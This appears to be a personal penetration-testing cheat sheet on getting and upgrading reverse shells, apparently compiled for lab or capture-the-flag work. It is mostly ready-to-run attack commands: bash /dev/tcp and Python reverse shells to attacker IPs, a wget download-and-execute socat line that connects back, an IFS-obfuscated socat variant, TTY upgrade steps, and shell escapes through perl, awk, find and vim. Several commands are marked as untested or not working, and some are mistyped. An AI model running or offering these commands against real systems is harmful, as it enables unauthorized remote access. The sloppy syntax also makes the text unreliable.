- on the attacker's side, a reverse shell obtained through a `netcat` tunnel can be improved (see [ropnop.com](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) or [0xffsec.com](https://0xffsec.com/handbook/shells/full-tty/))
- simple alternative way to have an upgrade netcat reverse shell: use `rlwrap <netcat listener command>`
- instead of using `netcat` and "upgrade" the shell manually, `pwncat-cs` ([calebstewart/pwncat](https://github.com/calebstewart/pwncat)) can be used to obtain an even better reverse shell experience (especially with UNIX-like targets).
#### PENNylope reverse shell can be used. (TBA)


### LINUX reverse shell command from victim
connect to attacker using dev/tcp and bash pipe
`send a reverse shell`
```
bash -i >& /dev/tcp/10.10.16.52/4444 0>&1


# THIS 1 DIDNT WORK:
bash -c "bash -i >&  /dev/tcp/10.10.x.x/9001 0>&1"'
```
### Python connect to attacker
```
os.system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.x.x/4444 0>&1' ")
```

## BLOG/NOPNOP'S GUIDE
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/



`pty python`
```bash
# In reverse shell $victim
python -c 'import pty; pty.spawn("/bin/bash")'
```
Ctrl-Z + enter
```shell
# In Kali
styy -a
stty raw -echo;fg
hit [ENTER]
hit [ENTER]
# In reverse shell
export TERM=xterm
```

done, you should have a tty by now


```shell
## extra commands
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols> (u get this from stty -a) 
#example:
stty rows 38 columns 116
```


## SOCAT shell upgrade SYNTAX (working)

#### 1. download socat
oneliner download and execute
```bash
wget -q http://10.10.16.52/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

run these on target and attacker
```
# listener
socat -d -d TCP-LISTEN:1338,reuseaddr,fork EXEC:'bash -li',pty,stderr,sigint,sane

# or try socat -d -d TCP-LISTEN:1338,reuseaddr,fork STDIO

# victim
/tmp/socat TCP:10.10.16.52:1338 EXEC:'bash -li',pty,stderr,sigint,sane

```

---

`socat` (untested/tested but didnt work)
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
socat TCP4:10.10.16.42:4444 EXEC:/bin/bash

's'o'c'a't'${IFS}TCP4:10.10.16.42:4444${IFS}EXEC:bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
``
# 2: Using socat

If `socat` is installed on the victim server, you can launch a reverse shell with it. You _must_ catch the connection with `socat` as well to get the full functions.
attacker:
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**On Victim (launch)**:
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

If socat isn’t installed, you’re not out of luck. There are standalone binaries that can be downloaded from this awesome Github repo:

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

oneliner download and execute
```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
On Kali, you’ll catch a fully interactive TTY session. It supports tab-completion, SIGINT/SIGSTP support, vim, up arrow history, etc. It’s a full terminal. Pretty sweet.

### tty shell


```shell-session
python -c 'import pty; pty.spawn("/bin/sh")' 
```

# Spawning Interactive Shells

## /bin/sh -i

This command will execute the shell interpreter specified in the path in interactive mode (`-i`).


```shell-session
/bin/sh -i
sh: no job control in this shell
sh-4.2$
```

---
## Perl

If the programming language [Perl](https://www.perl.org) is present on the system, these commands will execute the shell interpreter specified.


```shell-session
perl —e 'exec "/bin/sh";'
```



```shell-session
perl: exec "/bin/sh";
```

The command directly above should be run from a script.

---
## Ruby

If the programming language [Ruby](https://www.ruby-lang.org/en/) is present on the system, this command will execute the shell interpreter specified:



```shell-session
ruby: exec "/bin/sh"
```

The command directly above should be run from a script.

---
## Lua

If the programming language [Lua](https://www.lua.org) is present on the system, we can use the `os.execute` method to execute the shell interpreter specified using the full command below:


```shell-session
lua: os.execute('/bin/sh')
```

The command directly above should be run from a script.

---

## AWK

[AWK](https://man7.org/linux/man-pages/man1/awk.1p.html) is a C-like pattern scanning and processing language present on most UNIX/Linux-based systems, widely used by developers and sysadmins to generate reports. It can also be used to spawn an interactive shell. This is shown in the short awk script below:


```shell-session
awk 'BEGIN {system("/bin/sh")}'
```

---

## Find

[Find](https://man7.org/linux/man-pages/man1/find.1.html) is a command present on most Unix/Linux systems widely used to search for & through files and directories using various criteria. It can also be used to execute applications and invoke a shell interpreter.


```shell-session
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

This use of the find command is searching for any file listed after the `-name` option, then it executes `awk` (`/bin/awk`) and runs the same script we discussed in the awk section to execute a shell interpreter.

---

## Using Exec To Launch A Shell


```shell-session
find . -exec /bin/sh \; -quit
```

This use of the find command uses the execute option (`-exec`) to initiate the shell interpreter directly. If `find` can't find the specified file, then no shell will be attained.

---

## VIM

Yes, we can set the shell interpreter language from within the popular command-line-based text-editor `VIM`. This is a very niche situation we would find ourselves in to need to use this method, but it is good to know just in case.


```shell-session
vim -c ':!/bin/sh'
```


```shell-session
vim
:set shell=/bin/sh
:shell
```

---

## Execution Permissions Considerations

In addition to knowing about all the options listed above, we should be mindful of the permissions we have with the shell session's account. We can always attempt to run this command to list the file properties and permissions our account has over any given file or binary:


```shell-session
ls -la <path/to/fileorbinary>
```

We can also attempt to run this command to check what `sudo` permissions the account we landed on has:

#### Sudo -l